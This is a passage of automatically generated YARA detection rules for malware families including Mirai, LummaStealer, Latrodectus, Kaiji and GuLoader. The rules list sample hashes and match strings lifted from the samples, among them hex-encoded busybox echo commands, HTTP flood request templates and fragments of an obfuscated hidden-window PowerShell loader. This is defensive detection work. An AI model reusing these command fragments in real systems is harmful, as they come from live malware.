      $s14 = "/bin/busybox echo -ne \"\\x71\\x20\\x22\\x24\\x70\\x69\\x64\\x22\\x20\\x5D\\x20\\x32\\x3E\\x20\\x2F\\x64\\x65\\x76\\x2F\\x6E\\x7" ascii /* score: '11.00'*/
      $s15 = "/bin/busybox echo -ne \"\\x71\\x20\\x22\\x64\\x76\\x72\\x48\\x65\\x6C\\x70\\x65\\x72\\x22\\x3B\\x20\\x74\\x68\\x65\\x6E\\x0A\\x2" ascii /* score: '11.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 400KB and ( 8 of them )
      ) or ( all of them )
}

rule _LummaStealer_signature__5e98697203060725aab7eca3f617223d_imphash__LummaStealer_signature__5e98697203060725aab7eca3f617223d__53 {
   meta:
      description = "_subset_batch - from files LummaStealer(signature)_5e98697203060725aab7eca3f617223d(imphash).exe, LummaStealer(signature)_5e98697203060725aab7eca3f617223d(imphash)_3f6fef97.exe, LummaStealer(signature)_5e98697203060725aab7eca3f617223d(imphash)_5fa8bf1c.exe, LummaStealer(signature)_5e98697203060725aab7eca3f617223d(imphash)_bef6b29e.exe, LummaStealer(signature)_5e98697203060725aab7eca3f617223d(imphash)_d03217ad.exe, LummaStealer(signature)_be40317f77365bdf4dbd1877eee6bf25(imphash).exe, LummaStealer(signature)_be40317f77365bdf4dbd1877eee6bf25(imphash)_d9623957.exe, LummaStealer(signature)_c9391c4d011b74463c0b80c8ef62af14(imphash).exe, LummaStealer(signature)_c9391c4d011b74463c0b80c8ef62af14(imphash)_11c35469.exe, LummaStealer(signature)_c9391c4d011b74463c0b80c8ef62af14(imphash)_2a2b7581.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "6a68b00668d3ac5c0082dec8c5cf0946cd71ed3587894d757b120fabbe42492e"
      hash2 = "3f6fef9739ee9eba17ee6a82688d9f50535aea26b82db603fb0eb64c743974d8"
      hash3 = "5fa8bf1c6dab4b322458b9f6951c4313fd3748691d4bc8af35701f5d77046e5c"
      hash4 = "bef6b29eaa42c46e4683ebf436f2548450be75d10fe037bb0951228b86589f12"
      hash5 = "d03217ad3c0e5bcaa4565151956bd52146dd1fba25586bc92b66835133ffa562"
      hash6 = "fe5aedd6d39a3871c306cca4ff6dbb8b2dc980edebab92377e55576dac22f124"
      hash7 = "d962395717aee4ced8e39d3fe157df4aac1574f9466194abef32c0ac5a1b39d5"
      hash8 = "81c17b483fc9c5fcce9f9433b8679a19eae9cf3a46a7d5f6cac714f58f7e0ab9"
      hash9 = "11c35469deb313596ecd03c71a0d61a9ff6cb22c790d1c62bb1b79217c4f0e1a"
      hash10 = "2a2b75810cfd40cd803149592adbc5ae85d7a1c5f91a3cfa3c1593a1f84381c8"
   strings:
      $s1 = "  Ctrl+Alt+R  -> Recycle Documents\\AutoProx\\temp.txt" fullword wide /* score: '22.00'*/
      $s2 = "[HK] Recycled temp.txt" fullword wide /* score: '18.00'*/
      $s3 = "[i] Privilege %s not present in token (ok)." fullword wide /* score: '14.00'*/
      $s4 = "EventLog hotkeys started" fullword wide /* score: '12.00'*/
      $s5 = "CreateFileW(temp)" fullword wide /* score: '11.00'*/
      $s6 = "AutoProx temp file." fullword wide /* score: '11.00'*/
      $s7 = "[HK] Recycle failed" fullword wide /* score: '10.00'*/
      $s8 = "AutoProx Hotkeys running." fullword wide /* score: '10.00'*/
      $s9 = "[OK] Privilege %s enabled." fullword wide /* score: '10.00'*/
      $s10 = "[!] Some hotkeys failed. Try closing apps that use Ctrl+Alt+U/O/R/L." fullword wide /* score: '10.00'*/
      $s11 = "ENDSESSION" fullword wide /* score: '9.50'*/
      $s12 = "SHFileOperationW(FO_DELETE)" fullword wide /* score: '9.00'*/
      $s13 = "  Ctrl+Alt+O  -> Open Documents folder" fullword wide /* score: '8.00'*/
      $s14 = "  Ctrl+Alt+L  -> Lock workstation" fullword wide /* score: '8.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 6000KB and ( 8 of them )
      ) or ( all of them )
}

rule _Mirai_signature__00c1ea4d_Mirai_signature__01cb158d_Mirai_signature__06b6f527_Mirai_signature__0d57aae1_Mirai_signature__13_54 {
   meta:
      description = "_subset_batch - from files Mirai(signature)_00c1ea4d.elf, Mirai(signature)_01cb158d.elf, Mirai(signature)_06b6f527.elf, Mirai(signature)_0d57aae1.elf, Mirai(signature)_13af32d8.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "00c1ea4dcc447da03be41da9c55839f043a7298b99e4e91ff0d801aa445e3e0f"
      hash2 = "01cb158d1db0d9b5edb240be81c64632df83e7b41f4b899798deb5f405f3cb3d"
      hash3 = "06b6f527ab22c5b86aca78624180997ae77906de4d1c328720965467d5df6f0c"
      hash4 = "0d57aae1d5eb48a3684729255b3d8b3b9c7386204ff121c457e1b2d539b9bb3d"
      hash5 = "13af32d855bbac2af57d71348bcd28d43e64a3609b931f54bbb88d9284ddbd52"
   strings:
      $s1 = "Host: %s.com" fullword ascii /* score: '26.00'*/
      $s2 = "X-Forwarded-Host: %s.com" fullword ascii /* score: '26.00'*/
      $s3 = "user-agent: %s" fullword ascii /* score: '17.00'*/
      $s4 = "GET %s HTTP/3.0" fullword ascii /* score: '15.00'*/
      $s5 = "GET %s?%s=%s HTTP/1.1" fullword ascii /* score: '15.00'*/
      $s6 = "{\"query\":\"query { posts { id title content } }\"}" fullword ascii /* score: '14.00'*/
      $s7 = "{\"query\":\"query { users { id name email } }\"}" fullword ascii /* score: '12.00'*/
      $s8 = "{\"query\":\"mutation { updateUser(id: \\\"%d\\\", input: {name: \\\"%s\\\"}) { id } }\"}" fullword ascii /* score: '10.00'*/
      $s9 = "X-Original-Host: %s" fullword ascii /* score: '9.00'*/
      $s10 = "X-Host: %s" fullword ascii /* score: '9.00'*/
      $s11 = "Content-Encoding: br" fullword ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 500KB and ( 8 of them )
      ) or ( all of them )
}

rule _HijackLoader_signature__230f4de7_Latrodectus_signature__Latrodectus_signature__32f88614_Latrodectus_signature__339361f405a0_55 {
   meta:
      description = "_subset_batch - from files HijackLoader(signature)_230f4de7.msi, Latrodectus(signature).msi, Latrodectus(signature)_32f88614.msi, Latrodectus(signature)_339361f405a0d1100aa84614758ab758(imphash).exe, Latrodectus(signature)_339361f405a0d1100aa84614758ab758(imphash)_16474e9e.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "230f4de7b92166c695ad4f8bc469e2a39a31d0640ceb994d4f46f1afdabea90b"
      hash2 = "88e9c1f5026834ebcdaed98f56d52b5f23547ac2c03aa43c5e50e7d8e1b82b3a"
      hash3 = "32f886142de76f09b1e7229a79e66eb46889251ebf871e4df3b6de7fd5cef749"
      hash4 = "2fe0bd27009fc17f5150257cf84a74429005f101744ca20a4ad599ed6e6869c1"
      hash5 = "16474e9e4773fbc1e0b48a5025fad31b7f084b1beffb9a42687b4d01979885fe"
   strings:
      $s1 = "Ehttp://www.ssl.com/repository/SSLcomRootCertificationAuthorityRSA.crt0 " fullword ascii /* score: '19.00'*/
      $s2 = "5http://cert.ssl.com/SSL.com-timeStamping-I-RSA-R1.cer0Q" fullword ascii /* score: '17.00'*/
      $s3 = "!SSL.com Timestamping Unit 2024 E10Y0" fullword ascii /* score: '17.00'*/
      $s4 = "http://ocsps.ssl.com0?" fullword ascii /* score: '17.00'*/
      $s5 = "http://ocsps.ssl.com0P" fullword ascii /* score: '17.00'*/
      $s6 = "4http://crls.ssl.com/SSLcom-RootCA-EV-RSA-4096-R2.crl0" fullword ascii /* score: '16.00'*/
      $s7 = ">http://www.ssl.com/repository/SSLcom-RootCA-EV-RSA-4096-R2.crt0 " fullword ascii /* score: '16.00'*/
      $s8 = ".SSL.com EV Root Certification Authority RSA R20" fullword ascii /* score: '16.00'*/
      $s9 = "?http://crls.ssl.com/SSLcom-SubCA-EV-CodeSigning-RSA-4096-R3.crl0" fullword ascii /* score: '13.00'*/
      $s10 = "&SSL.com Timestamping Issuing RSA CA R10" fullword ascii /* score: '13.00'*/
      $s11 = "&SSL.com Timestamping Issuing RSA CA R1" fullword ascii /* score: '13.00'*/
      $s12 = "?http://cert.ssl.com/SSLcom-SubCA-EV-CodeSigning-RSA-4096-R3.cer0 " fullword ascii /* score: '13.00'*/
      $s13 = "5http://crls.ssl.com/SSL.com-timeStamping-I-RSA-R1.crl0" fullword ascii /* score: '13.00'*/
      $s14 = ".SSL.com EV Code Signing Intermediate CA RSA R3" fullword ascii /* score: '12.00'*/
      $s15 = ".SSL.com EV Code Signing Intermediate CA RSA R30" fullword ascii /* score: '12.00'*/
   condition:
      ( ( uint16(0) == 0xcfd0 or uint16(0) == 0x5a4d ) and filesize < 8000KB and pe.imphash() == "339361f405a0d1100aa84614758ab758" and ( 8 of them )
      ) or ( all of them )
}

rule _Kaiji_signature__78e6c917_Kaiji_signature__8895157c_Kaiji_signature__a82036bb_Kaiji_signature__af3c1821_Kaiji_signature__bd_56 {
   meta:
      description = "_subset_batch - from files Kaiji(signature)_78e6c917.elf, Kaiji(signature)_8895157c.elf, Kaiji(signature)_a82036bb.elf, Kaiji(signature)_af3c1821.elf, Kaiji(signature)_bd7a37a8.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "78e6c917b26061148d6a1f589521c9a91cb3c35d7263b046bbbfb08e7ad43c34"
      hash2 = "8895157c86f0f62ccc96c12ca064bb7cc1d311cbe94467fbe9895f3aa74b5f43"
      hash3 = "a82036bbe31274fd6c010f76f210d3c81dfbc47eb36843a9ce5e5ea50a6cd29f"
      hash4 = "af3c182144f6ec184bbae0429ffe5d29767cd82cec0410faf6fa3068b4551afb"
      hash5 = "bd7a37a86a1fa6831f426d1570f702aaffe454b4609eda5f111b7bd0f4d6da81"
   strings:
      $x1 = "runtime: p.gcMarkWorkerMode= runtime: split stack overflowruntime: sudog with non-nil cruntime: summary max pages = runtime: tra" ascii /* score: '45.50'*/
      $s2 = "Mutextimer period must be non-negativetls: failed to write to key log: tls: invalid server finished hashtls: unexpected ServerKe" ascii /* score: '26.00'*/
      $s3 = "on in sysAllocnet/http: skip alternate protocolpad size larger than data payloadpseudo header field after regularreflect.nameFro" ascii /* score: '21.00'*/
      $s4 = "utex statesync: unlock of unlocked mutextransform: short source bufferunsafe.Slice: len out of rangewebsocket: read limit exceed" ascii /* score: '18.00'*/
      $s5 = "ossible type kind socket operation on non-socketstream error: stream ID %d; %vsubtle.XORBytes: dst too shortsync: inconsistent m" ascii /* score: '17.50'*/
      $s6 = "ckcrypto: requested hash function #findrunnable: negative nmspinningframe_pushpromise_promiseid_shortfreeing stack not in a stac" ascii /* score: '13.00'*/
      $s7 = "putslow: queue is not fullruntime: bad pointer in frame runtime: epollctl failed with runtime: found in object at *(runtime: imp" ascii /* score: '13.00'*/
      $s8 = "ice index out of rangeruntime: castogscanstatus oldval=runtime: epollcreate failed with runtime: failed mSpanList.insert runtime" ascii /* score: '11.00'*/
      $s9 = "D: child status has changedSIGTTIN: background read from ttySIGXFSZ: file size limit exceededbase outside usable address spaceby" ascii /* score: '10.00'*/
      $s10 = "und on stackmemory page has hardware errormissing validateFirstLine funcpersistConn was already in LRUprotocol version not suppo" ascii /* score: '10.00'*/
      $s11 = "tes.Buffer.Grow: negative countconcurrent map read and map writecrypto/aes: output not full blockcrypto/des: output not full blo" ascii /* score: '10.00'*/
      $s12 = "]stackalloc not on scheduler stackstoplockedm: inconsistent lockingstruct contains unexported fieldssync: RUnlock of unlocked RW" ascii /* score: '10.00'*/
      $s13 = "k spango package net: confVal.netCgo = http: CloseIdleConnections calledhttp: invalid Read on closed Bodyindefinite length found" ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 17000KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _Mirai_signature__00c1ea4d_Mirai_signature__01cb158d_Mirai_signature__0436ef41_Mirai_signature__06b6f527_Mirai_signature__0d_57 {
   meta:
      description = "_subset_batch - from files Mirai(signature)_00c1ea4d.elf, Mirai(signature)_01cb158d.elf, Mirai(signature)_0436ef41.elf, Mirai(signature)_06b6f527.elf, Mirai(signature)_0d57aae1.elf, Mirai(signature)_1266921b.elf, Mirai(signature)_13af32d8.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "00c1ea4dcc447da03be41da9c55839f043a7298b99e4e91ff0d801aa445e3e0f"
      hash2 = "01cb158d1db0d9b5edb240be81c64632df83e7b41f4b899798deb5f405f3cb3d"
      hash3 = "0436ef4186a89f5d0f6ac3dcf057fee1f8c43c5dcd1b87ff68f66a5d72856136"
      hash4 = "06b6f527ab22c5b86aca78624180997ae77906de4d1c328720965467d5df6f0c"
      hash5 = "0d57aae1d5eb48a3684729255b3d8b3b9c7386204ff121c457e1b2d539b9bb3d"
      hash6 = "1266921bdf3adb8d7d4fcd77abcd66bcd269e8d6594f2b45a9280c68d29ba6c1"
      hash7 = "13af32d855bbac2af57d71348bcd28d43e64a3609b931f54bbb88d9284ddbd52"
   strings:
      $s1 = "processCmd" fullword ascii /* score: '18.00'*/
      $s2 = "UserAgents" fullword ascii /* score: '12.00'*/
      $s3 = "httphex" fullword ascii /* score: '11.00'*/
      $s4 = "resolv_domain_to_hostname" fullword ascii /* score: '9.00'*/
      $s5 = "vseattack" fullword ascii /* score: '8.00'*/
      $s6 = "hextable" fullword ascii /* score: '8.00'*/
      $s7 = "fdpopen" fullword ascii /* score: '8.00'*/
      $s8 = "szprintf" fullword ascii /* score: '8.00'*/
      $s9 = "makevsepacket" fullword ascii /* score: '8.00'*/
      $s10 = "zprintf" fullword ascii /* score: '8.00'*/
      $s11 = "fdpclose" fullword ascii /* score: '8.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 500KB and ( 8 of them )
      ) or ( all of them )
}

rule _GuLoader_signature__GuLoader_signature__5af13597_58 {
   meta:
      description = "_subset_batch - from files GuLoader(signature).img, GuLoader(signature)_5af13597.bat"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "d15338cf2df85b6016b0cdd056f18e59838c62077c8b97021e999fc480aee0c2"
      hash2 = "5af13597a9d4d5c9a2b50da164522b415c14315d842c8ea5312fd07613f8ae42"
   strings:
      $x1 = "powershell.exe -windowstyle hidden \"spsv fejldata;function latiner ($gangste){ $bremsela=3;do {$roedhaett+=$gangste[$bremsela];" ascii /* score: '37.00'*/
      $s2 = "powershell.exe -windowstyle hidden \"spsv fejldata;function latiner ($gangste){ $bremsela=3;do {$roedhaett+=$gangste[$bremsela];" ascii /* score: '27.00'*/
      $s3 = "KKlK KiKK dKKKsKKK.KKKmKKKs.KKi';$forgrunds=latiner ' &&>';$nontr=latiner 'qqqIqqqeqq x';$thanat='paracetald';$mentzelia='\\Hous" ascii /* score: '10.00'*/
      $s4 = "hol.Ana';Svibe (latiner 'iii$iiigiiiL.iiOii bi iaiiiliii:iiiUiiiDiiiEiiib iilii,iiiiviiie ii=iii$iiiei,iNiiiViii:iiiAi iP,iip  i" ascii /* score: '10.00'*/
      $s5 = " LLoLL u LLNLL T') ;$largemo=$konsta[$fodoruns]}$paagl=388619;$auth=23155;Svibe (latiner 'rrr$r rgrrrl rro rrB rrarrrL r :rr A  " ascii /* score: '10.00'*/
      $s6 = "LLD LLoLLLRLL ULLLnLLLsLLL= LL$LLLgLL L  Lo L BL,LaLL l L :LLLlLLLa LLULLLrLLLEL,L+ LL+LLL%%L,L$LL kLLLoLLLnLLLS  LTLLLALLL.L Lc" ascii /* score: '8.00'*/
      $s7 = "SS0S S;SSS SSSWSSSi SSn S 6SSS4S S;SSS SSSxSSS6SSS4SSS;SSS  SSrS SvSSS: SS1 SS4S.S1SSS.SS 0 SS)SSS  SSGSSSe S cSSSk SSoSS /SSS2 " ascii /* score: '8.00'*/
      $s8 = "SS0,SS1SSS0 SS0SSS1SSS0 ,S1S,S SSSFSS i  SrSSSeSSSfS.SoSSSxSSS/ SS1SSS4 SS1SSS.SSS0';$bismarc=latiner ' HHuHHHsHHHE HHrHHH-  HaH" ascii /* score: '8.00'*/
      $s9 = "O bbbbbbAb blbbb:bbbZbb YbbbMbb,Obb.gbbbebbbNbbb=bbb(bb TbbbebbbsbbbT bb- b.P bbA b.t b Hbbb bbb$ b ubb NbbbIbbbv bbe b rbbbSbbb" ascii /* score: '8.00'*/
      $s10 = "rfrr Mrr.Arrr  rr=rrr  rrG rre rrTrrr- rrcrrrOrrrN ,rt rrE rrn rrTr r rrr$ rru rrNrrrI rrVrrrErrrRrrrsrrrI');Svibe (latiner '___" ascii /* score: '8.00'*/
   condition:
      ( ( uint16(0) == 0x0000 or uint16(0) == 0x6f70 ) and filesize < 200KB and ( 1 of ($x*) and all of them )
      ) or ( all of them )
}

rule _Kaiji_signature__Kaiji_signature__7cab2814_Kaiji_signature__8895157c_Kaiji_signature__a82036bb_Kaiji_signature__af3c1821_Ka_59 {
   meta:
      description = "_subset_batch - from files Kaiji(signature).elf, Kaiji(signature)_7cab2814.elf, Kaiji(signature)_8895157c.elf, Kaiji(signature)_a82036bb.elf, Kaiji(signature)_af3c1821.elf, Kaiji(signature)_bd7a37a8.elf, Kaiji(signature)_c6c0da6a.elf, Kaiji(signature)_ded5e440.elf, Kaiji(signature)_eec9b44f.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "aead4ac6bea6859316dce9aeda0d704e05293466dde897247c7c32cb32c6a4e1"
      hash2 = "7cab2814a06c64a3cacd86d90222f469c67a4c9ff927c8fc0b262f8a667b2992"
      hash3 = "8895157c86f0f62ccc96c12ca064bb7cc1d311cbe94467fbe9895f3aa74b5f43"
      hash4 = "a82036bbe31274fd6c010f76f210d3c81dfbc47eb36843a9ce5e5ea50a6cd29f"
      hash5 = "af3c182144f6ec184bbae0429ffe5d29767cd82cec0410faf6fa3068b4551afb"
      hash6 = "bd7a37a86a1fa6831f426d1570f702aaffe454b4609eda5f111b7bd0f4d6da81"
      hash7 = "c6c0da6a5a6c95627c240816ab46ccf88b5e661c59827c33e9af6ef4080855d8"
      hash8 = "ded5e44044fbffebe6a1beb9d66f8c9282cbf7cef065d8231244997f0829a84e"
      hash9 = "eec9b44f6de1f6157457edc8da37f9813a75b3176c61f89b7aa78dcdf7890892"
   strings:
      $x1 = "bytes.Buffer: reader returned negative count from Readcryptobyte: Builder is exceeding its fixed-size buffergcControllerState.fi" ascii /* score: '57.00'*/
      $s2 = "cs=network is downno medium foundno such processnon-minimal tagnot a directorypreempt SPWRITErecord overflowrecovery failedrecv_" ascii /* score: '18.00'*/
      $s3 = ": request body larger than specified content lengthhttp2: response header list larger than advertised limithttp: Request.Request" ascii /* score: '17.00'*/
      $s4 = "CBCDecrypter: IV length must equal block sizecipher.NewCBCEncrypter: IV length must equal block sizedecompressed len (%d) does n" ascii /* score: '17.00'*/
      $s5 = "ssary HelloRetryRequest message9d6ccf36bc1d3628d460d730bd096b25d37ad30af0022a21db6e9526fbGODEBUG=execwait=2 detected a leaked ex" ascii /* score: '17.00'*/
      $s6 = "ot match specified len (%d)gentraceback callback cannot be used with non-zero skipmheap.freeSpanLocked - invalid free of user ar" ascii /* score: '14.00'*/
      $s7 = " end with a .)net/http: can't write control character in Request.URLno goroutines (main called runtime.Goexit) - deadlock!read l" ascii /* score: '14.00'*/
      $s8 = "ec.Cmd created by:" fullword ascii /* score: '12.00'*/
      $s9 = "ndRunnable: blackening not enabledhttp: Request.Write on Request with no Host or URL setname is not in canonical format (it must" ascii /* score: '11.00'*/
      $s10 = "9432355ffb4b70e0cbd6bb4bf7f321390b94a03c1d356c21122343280d6115c1d21bd376388b5f723fb4c22dfe6cd4375a05a07476444d5819985007e34http2" ascii /* score: '11.00'*/
      $s11 = "bytes.Buffer: reader returned negative count from Readcryptobyte: Builder is exceeding its fixed-size buffergcControllerState.fi" ascii /* score: '10.00'*/
      $s12 = " public keys are not supported before TLS 1.2tls: server selected an invalid PSK and cipher suite pairtls: server sent an unnece" ascii /* score: '10.00'*/
      $s13 = "internal error: invalid use of makeMethodValuetls: internal error: handshake should have had a resultx509: failed to load system" ascii /* score: '10.00'*/
      $s14 = "cting version %xruntime: checkmarks found unexpected unmarked object obj=runtime: failed to disable profiling timer; timer_delet" ascii /* score: '10.00'*/
      $s15 = "lid ver/cmdinvalid versionkey has expiredlibgdi.so.0.8.1malloc deadlockmisaligned maskmissing addressmissing mcache?ms: gomaxpro" ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 17000KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _Mirai_signature__0052d359_Mirai_signature__033cd9aa_Mirai_signature__03ea04af_Mirai_signature__042aca85_Mirai_signature__05_60 {
   meta:
      description = "_subset_batch - from files Mirai(signature)_0052d359.elf, Mirai(signature)_033cd9aa.elf, Mirai(signature)_03ea04af.elf, Mirai(signature)_042aca85.elf, Mirai(signature)_05bdf042.elf, Mirai(signature)_0729e659.elf, Mirai(signature)_0c39b52c.elf, Mirai(signature)_0c78114c.elf, Mirai(signature)_0d99ad98.elf, Mirai(signature)_0dadbc90.elf, Mirai(signature)_0dd239f6.elf, Mirai(signature)_144040da.elf, Mirai(signature)_15a7975e.elf, Mirai(signature)_1765e655.elf, Mirai(signature)_1aa3314d.elf, Mirai(signature)_1b9e2c13.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "0052d359df89257e8b0975db343e1285554b28ef45b8df7eaf395e02b00908f5"
      hash2 = "033cd9aa62ca6980985ef7cce094d45525988a3991218d8e524bcd81dec4d7c7"
      hash3 = "03ea04af011a578e2e0532087517f2194aa5e886bef9c6dce7e140a04a63ef1c"
      hash4 = "042aca85b7dcc5d85050e85d169481e44640a63b2a189df1a9d045855a329497"
      hash5 = "05bdf042cb2c7351d93378a105c2a78929b59ecc22df66bc1130f7a0798d17f1"
      hash6 = "0729e6598e04e70a3d468aef8efb9cdf343b1b12663254bc65e6a5152dd1e127"
      hash7 = "0c39b52ce1ad1873e0db99dbceaa42fad3d3832d02e48321d2f38f5e8d1ce59e"
      hash8 = "0c78114cfef3f035568e35480bb725c7521c3cd4e9023244cd9372921e6d4c16"
      hash9 = "0d99ad98a68c10d75f4a77c08727896bf03ddb3faa08af7b0058691097e04a31"
      hash10 = "0dadbc901eae614d192c754c52ae2e5205e87b0f6dff7684f012f33721d170c8"
      hash11 = "0dd239f64d3b1661218bcf4886781dd8f8ca634ba110c9dab7adaa03434e7a08"
      hash12 = "144040da9bfbf8f6adb89bb3286f6b496149000d31b6b1a8a146b1ffb64ebbbf"
      hash13 = "15a7975e5642dbdd4abdb01341b46c9f3ce15469932f5249bd0ef64f8a64a63d"
      hash14 = "1765e65558047e0c78d3357701d660f860308ad2479b5865f19ab427cfdc3470"
      hash15 = "1aa3314d436064fad32b552018b5532e1d8ed696fa29e531d3432893f688b070"
      hash16 = "1b9e2c13f4012fae670c512313bfa25ec335072ea281b407cc5b82efb9ae1f86"
   strings:
      $s1 = "Mozilla/5.0 (iPad; CPU OS 8_4 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H143 Safari/600.1.4" fullword ascii /* score: '12.00'*/
      $s2 = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_4) AppleWebKit/600.7.12 (KHTML, like Gecko) Version/8.0.7 Safari/600.7.12" fullword ascii /* score: '12.00'*/
      $s3 = "Mozilla/5.0 (iPad; CPU OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H321 Safari/600.1.4" fullword ascii /* score: '12.00'*/
      $s4 = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/600.8.9 (KHTML, like Gecko) Version/8.0.8 Safari/600.8.9" fullword ascii /* score: '12.00'*/
      $s5 = "Mozilla/5.0 (iPad; CPU OS 8_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12F69 Safari/600.1.4" fullword ascii /* score: '12.00'*/
      $s6 = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/600.8.9 (KHTML, like Gecko) Version/7.1.8 Safari/537.85.17" fullword ascii /* score: '12.00'*/
      $s7 = "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36" fullword ascii /* score: '9.00'*/
      $s8 = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:40.0) Gecko/20100101 Firefox/40.0" fullword ascii /* score: '9.00'*/
      $s9 = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/37.0.2062.94 Chrome/37.0.2062.94 Safari/5" ascii /* score: '9.00'*/
      $s10 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.1024" ascii /* score: '9.00'*/
      $s11 = "Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko" fullword ascii /* score: '9.00'*/
      $s12 = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/37.0.2062.94 Chrome/37.0.2062.94 Safari/5" ascii /* score: '9.00'*/
      $s13 = "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko" fullword ascii /* score: '9.00'*/
      $s14 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.1024" ascii /* score: '9.00'*/
      $s15 = "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36" fullword ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 500KB and ( 8 of them )
      ) or ( all of them )
}

rule _Kaiji_signature__78e6c917_Kaiji_signature__7cab2814_Kaiji_signature__8895157c_Kaiji_signature__a82036bb_Kaiji_signature__af_61 {
   meta:
      description = "_subset_batch - from files Kaiji(signature)_78e6c917.elf, Kaiji(signature)_7cab2814.elf, Kaiji(signature)_8895157c.elf, Kaiji(signature)_a82036bb.elf, Kaiji(signature)_af3c1821.elf, Kaiji(signature)_bd7a37a8.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "78e6c917b26061148d6a1f589521c9a91cb3c35d7263b046bbbfb08e7ad43c34"
      hash2 = "7cab2814a06c64a3cacd86d90222f469c67a4c9ff927c8fc0b262f8a667b2992"
      hash3 = "8895157c86f0f62ccc96c12ca064bb7cc1d311cbe94467fbe9895f3aa74b5f43"
      hash4 = "a82036bbe31274fd6c010f76f210d3c81dfbc47eb36843a9ce5e5ea50a6cd29f"
      hash5 = "af3c182144f6ec184bbae0429ffe5d29767cd82cec0410faf6fa3068b4551afb"
      hash6 = "bd7a37a86a1fa6831f426d1570f702aaffe454b4609eda5f111b7bd0f4d6da81"
   strings:
      $s1 = "ck of unlocked RWMutexsync: negative WaitGroup countertls: NextProtos values too largetls: unknown Renegotiation valuetransform:" ascii /* score: '20.00'*/
      $s2 = ": input not full blockcrypto/ecdh: invalid private keyed25519: bad public key length: end outside usable address spaceframe_wind" ascii /* score: '18.00'*/
      $s3 = "meFrom: tag too long: reflect: NumIn of non-func type removespecial on invalid pointerresource temporarily unavailableruntime: f" ascii /* score: '14.00'*/
      $s4 = "N*struct { F uintptr; .autotmp_10 *http.Transport; .autotmp_11 *http.wantConn }" fullword ascii /* score: '13.00'*/
      $s5 = "N*struct { F uintptr; .autotmp_19 *http.Transport; .autotmp_20 *http.wantConn }" fullword ascii /* score: '13.00'*/
      $s6 = "L*struct { F uintptr; .autotmp_7 *http.Transport; .autotmp_8 *http.wantConn }" fullword ascii /* score: '13.00'*/
      $s7 = "owupdate_zero_inc_conngo package net: hostLookupOrder(integer is not minimally encodedinvalid limiter event type foundnon-Go cod" ascii /* score: '12.00'*/
      $s8 = "ds out of range [:%x:]slice bounds out of range [::%x]software caused connection abortsweep increased allocation countsync: Unlo" ascii /* score: '10.50'*/
      $s9 = "4*struct { F uintptr; .autotmp_34 *http.persistConn }" fullword ascii /* score: '10.00'*/
      $s10 = "ot parse rfc822Name %qx509: invalid constraint value: x509: malformed subjectPublicKeyx509: unsupported elliptic curve of method" ascii /* score: '10.00'*/
      $s11 = "*struct { F uintptr; .autotmp_16 *http.http2addConnCall; .autotmp_17 *http.http2Transport; .autotmp_18 string; .autotmp_19 *tls." ascii /* score: '9.00'*/
      $s12 = "*struct { F uintptr; .autotmp_16 *http.http2addConnCall; .autotmp_17 *http.http2Transport; .autotmp_18 string; .autotmp_19 *tls." ascii /* score: '9.00'*/
      $s13 = "tack split at bad timeruntime: sudog with non-nil elemruntime: sudog with non-nil nextruntime: sudog with non-nil prevscanstack:" ascii /* score: '8.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 17000KB and ( 8 of them )
      ) or ( all of them )
}

rule _Kaiji_signature__8895157c_Kaiji_signature__a82036bb_Kaiji_signature__af3c1821_Kaiji_signature__bd7a37a8_Kaiji_signature__de_62 {
   meta:
      description = "_subset_batch - from files Kaiji(signature)_8895157c.elf, Kaiji(signature)_a82036bb.elf, Kaiji(signature)_af3c1821.elf, Kaiji(signature)_bd7a37a8.elf, Kaiji(signature)_ded5e440.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
